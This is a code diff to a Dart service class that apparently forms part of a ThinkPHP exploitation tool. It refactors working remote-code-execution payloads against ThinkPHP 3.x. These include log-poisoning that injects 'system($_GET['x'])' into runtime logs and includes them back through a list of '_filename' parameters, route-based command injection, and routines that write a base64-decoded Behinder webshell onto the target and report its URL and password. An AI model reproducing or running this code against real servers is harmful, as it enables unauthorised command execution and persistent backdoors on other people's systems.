@@ -29,6 +29,20 @@ class ThinkphpExpService {
 
   /// 默认模块检测顺序（与 ThinkphpGUI Module.java 一致）
   static const List<String> _defaultModules = ['manage', 'admin', 'api'];
+  static const List<String> _tp3LogRceFilenameParams = [
+    'value[_filename]',
+    'info[_filename]',
+    'param[_filename]',
+    'name[_filename]',
+    'array[_filename]',
+    'arr[_filename]',
+    'list[_filename]',
+    'page[_filename]',
+    'menus[_filename]',
+    'var[_filename]',
+    'data[_filename]',
+    'module[_filename]',
+  ];
 
   /// 预检：目标是否为 ThinkPHP（避免非 ThinkPHP 站点误报）
   Future<bool> isThinkPHP() async {
@@ -36,7 +50,9 @@ class ThinkphpExpService {
       final res = await http.get(baseUri).timeout(timeout);
       final body = res.body.toLowerCase();
       final combined = '$body ${res.headers.toString().toLowerCase()}';
-      if (RegExp(r'thinkphp|think-php|runtime|\[ info \]|\[ error \]').hasMatch(combined)) {
+      if (RegExp(
+        r'thinkphp|think-php|runtime|\[ info \]|\[ error \]',
+      ).hasMatch(combined)) {
         return true;
       }
       if (body.contains('php version') || body.contains('<?php')) return true;
@@ -82,7 +98,8 @@ class ThinkphpExpService {
   /// 8. ThinkPHP 3.x RCE
   Future<ThinkphpResult> checkTp3() async {
     final mod = await _getModule();
-    final payload = '${baseUri}?s=$mod/\\think\\module/action/param1/\${@phpinfo()}';
+    final payload =
+        '${baseUri}?s=$mod/\\think\\module/action/param1/\${@phpinfo()}';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
       if (res.body.contains(_phpVersionCheck)) {
@@ -95,20 +112,14 @@ class ThinkphpExpService {
   /// 10. ThinkPHP 3.x Log RCE
   Future<ThinkphpResult> checkTp3LogRce() async {
     final now = DateTime.now();
-    final y = now.year.toString();
-    final m = now.month.toString().padLeft(2, '0');
-    final d = now.day.toString().padLeft(2, '0');
-    final suffix = '${y.substring(2)}_${m}_$d.log';
-    final payloadLog = '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20phpinfo();?>';
-    final logRces = [
-      'value[_filename]', 'info[_filename]', 'param[_filename]', 'name[_filename]',
-      'array[_filename]', 'arr[_filename]', 'list[_filename]', 'page[_filename]',
-      'menus[_filename]', 'var[_filename]', 'data[_filename]', 'module[_filename]',
-    ];
+    final suffix = _tp3LogSuffix(now);
+    final payloadLog =
+        '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20phpinfo();?>';
     try {
       await http.get(Uri.parse(payloadLog)).timeout(timeout);
-      for (final param in logRces) {
-        final u = '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix';
+      for (final param in _tp3LogRceFilenameParams) {
+        final u =
+            '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 3.x Log RCE', u);
@@ -147,7 +158,8 @@ class ThinkphpExpService {
   /// 15. ThinkPHP 3.x Module/Action/Param 变体（POC #17）
   Future<ThinkphpResult> checkTp3Module() async {
     final mod = await _getModule();
-    final payload = '${baseUri}?s=$mod/\\think\\Module/Action/Param/\${@phpinfo()}';
+    final payload =
+        '${baseUri}?s=$mod/\\think\\Module/Action/Param/\${@phpinfo()}';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
       if (res.body.contains(_phpVersionCheck)) {
@@ -160,7 +172,8 @@ class ThinkphpExpService {
   /// 18. ThinkPHP 3.x module/aciton 拼写变体（POC #18）
   Future<ThinkphpResult> checkTp3ModuleTypo() async {
     final mod = await _getModule();
-    final payload = '${baseUri}?s=$mod/\\think\\module/aciton/param1/\${@phpinfo()}';
+    final payload =
+        '${baseUri}?s=$mod/\\think\\module/aciton/param1/\${@phpinfo()}';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
       if (res.body.contains(_phpVersionCheck)) {
@@ -205,7 +218,9 @@ class ThinkphpExpService {
   }
 
   /// 检测多个漏洞类型
-  Future<List<ThinkphpResult>> checkMultiple(List<ThinkphpVulnType> types) async {
+  Future<List<ThinkphpResult>> checkMultiple(
+    List<ThinkphpVulnType> types,
+  ) async {
     final results = <ThinkphpResult>[];
     for (final t in types) {
       results.add(await checkSingle(t));
@@ -262,34 +277,29 @@ class ThinkphpExpService {
       case ThinkphpVulnType.tp3Module:
         final mod = await _getModule();
         final encodedCmd = Uri.encodeComponent(cmd);
-        final u = '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
+        final u =
+            '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
         return res.body;
 
       case ThinkphpVulnType.tp3ModuleTypo:
         final mod = await _getModule();
         final encodedCmd = Uri.encodeComponent(cmd);
-        final u = '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
+        final u =
+            '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
         return res.body;
 
       case ThinkphpVulnType.tp3:
         final mod = await _getModule();
         final encodedCmd = Uri.encodeComponent(cmd);
-        final u = '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
+        final u =
+            '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
         return res.body;
 
       case ThinkphpVulnType.tp3LogRce:
-        final encodedCmd = Uri.encodeComponent(cmd);
-        final now = DateTime.now();
-        final suffix = '${now.year.toString().substring(2)}_${now.month.toString().padLeft(2, '0')}_${now.day.toString().padLeft(2, '0')}.log';
-        final payloadLog = '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20system(\$_GET[\'x\']);?>';
-        await http.get(Uri.parse(payloadLog)).timeout(timeout);
-        final logRes = '${baseUri}?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/$suffix&x=$encodedCmd';
-        final res = await http.get(Uri.parse(logRes)).timeout(timeout);
-        return res.body.contains(_phpVersionCheck) ? res.body : null;
-
+        return _executeTp3LogRce(cmd);
     }
   }
 
@@ -304,7 +314,9 @@ class ThinkphpExpService {
       case ThinkphpVulnType.tp2:
         const shellFile = 'php_behinder.php';
         final shellB64 = base64.encode(utf8.encode(shellContent));
-        final writeCmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
+        final writeCmd = Uri.encodeComponent(
+          "echo '$shellB64'|base64 -d>$shellFile",
+        );
         final writeUrls = [
           '${baseUri}index.php?s=/index/index/name/\${@system(\'$writeCmd\')}',
           '$baseUri?s=/index/index/name/\${@system(\'$writeCmd\')}',
@@ -314,8 +326,11 @@ class ThinkphpExpService {
             await http.get(Uri.parse(u)).timeout(timeout);
           } catch (_) {}
         }
-        final check2 = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        if (check2.statusCode == 200) return '$baseUri$shellFile Pass:$password';
+        final check2 = await http
+            .get(Uri.parse('$baseUri$shellFile'))
+            .timeout(timeout);
+        if (check2.statusCode == 200)
+          return '$baseUri$shellFile Pass:$password';
         return null;
       case ThinkphpVulnType.tp50:
       case ThinkphpVulnType.tp5010:
@@ -331,11 +346,17 @@ class ThinkphpExpService {
         const shellFile = 'php_behinder.php';
         final shellPass = password;
         final shellB64 = base64.encode(utf8.encode(shellContent));
-        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
-        final u = '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$cmd';
+        final cmd = Uri.encodeComponent(
+          "echo '$shellB64'|base64 -d>$shellFile",
+        );
+        final u =
+            '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$cmd';
         await http.get(Uri.parse(u)).timeout(timeout);
-        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        final check = await http
+            .get(Uri.parse('$baseUri$shellFile'))
+            .timeout(timeout);
+        if (check.statusCode == 200)
+          return '$baseUri$shellFile Pass:$shellPass';
         return null;
 
       case ThinkphpVulnType.tp3ModuleTypo:
@@ -343,11 +364,17 @@ class ThinkphpExpService {
         const shellFile = 'php_behinder.php';
         final shellPass = password;
         final shellB64 = base64.encode(utf8.encode(shellContent));
-        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
-        final u = '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
+        final cmd = Uri.encodeComponent(
+          "echo '$shellB64'|base64 -d>$shellFile",
+        );
+        final u =
+            '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
         await http.get(Uri.parse(u)).timeout(timeout);
-        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        final check = await http
+            .get(Uri.parse('$baseUri$shellFile'))
+            .timeout(timeout);
+        if (check.statusCode == 200)
+          return '$baseUri$shellFile Pass:$shellPass';
         return null;
 
       case ThinkphpVulnType.tp3:
@@ -356,28 +383,64 @@ class ThinkphpExpService {
         final shellPass = password;
         final shellB64 = base64.encode(utf8.encode(shellContent));
         // TP3 使用 system 执行命令写入
-        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
-        final u = '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
+        final cmd = Uri.encodeComponent(
+          "echo '$shellB64'|base64 -d>$shellFile",
+        );
+        final u =
+            '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
         await http.get(Uri.parse(u)).timeout(timeout);
-        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        final check = await http
+            .get(Uri.parse('$baseUri$shellFile'))
+            .timeout(timeout);
+        if (check.statusCode == 200)
+          return '$baseUri$shellFile Pass:$shellPass';
         return null;
 
       case ThinkphpVulnType.tp3LogRce:
-        final shellEnc = Uri.encodeComponent(shellContent);
+        const shellFile = 'php_behinder.php';
         final shellPass = password;
-        final now = DateTime.now();
-        final suffix = '${now.year.toString().substring(2)}_${now.month.toString().padLeft(2, '0')}_${now.day.toString().padLeft(2, '0')}.log';
-        final logShell = '${baseUri}?m=Home&c=Index&a=index&test=-->%20$shellEnc';
-        await http.get(Uri.parse(logShell)).timeout(timeout);
-        final logRes = '${baseUri}?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/$suffix';
-        final check = await http.get(Uri.parse(logRes)).timeout(timeout);
-        if (check.statusCode == 200) return '$logRes Pass:$shellPass';
+        final shellB64 = base64.encode(utf8.encode(shellContent));
+        await _executeTp3LogRce("echo '$shellB64'|base64 -d>$shellFile");
+        final check = await http
+            .get(Uri.parse('$baseUri$shellFile'))
+            .timeout(timeout);
+        if (check.statusCode == 200)
+          return '$baseUri$shellFile Pass:$shellPass';
         return null;
-
     }
   }
 
+  String _tp3LogSuffix(DateTime now) {
+    final y = now.year.toString();
+    final m = now.month.toString().padLeft(2, '0');
+    final d = now.day.toString().padLeft(2, '0');
+    return '${y.substring(2)}_${m}_$d.log';
+  }
+
+  Future<String?> _executeTp3LogRce(String cmd) async {
+    const begin = 'MATRIX_TP3_LOG_BEGIN';
+    const end = 'MATRIX_TP3_LOG_END';
+    final encodedCmd = Uri.encodeComponent(cmd);
+    final suffix = _tp3LogSuffix(DateTime.now());
+    final payload = Uri.encodeComponent(
+      '--> <?php echo "$begin"; system(\$_GET["x"]); echo "$end";?>',
+    );
+    final payloadLog = '${baseUri}?m=Home&c=Index&a=index&test=$payload';
+    await http.get(Uri.parse(payloadLog)).timeout(timeout);
+
+    for (final param in _tp3LogRceFilenameParams) {
+      final logRes =
+          '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix&x=$encodedCmd';
+      final res = await http.get(Uri.parse(logRes)).timeout(timeout);
+      final body = res.body;
+      final start = body.indexOf(begin);
+      final finish = body.indexOf(end, start + begin.length);
+      if (start != -1 && finish != -1 && finish >= start) {
+        return body.substring(start + begin.length, finish).trim();
+      }
+    }
+    return null;
+  }
 
   String _extractBeforeHtml(String body) {
     final idx = body.indexOf('<');
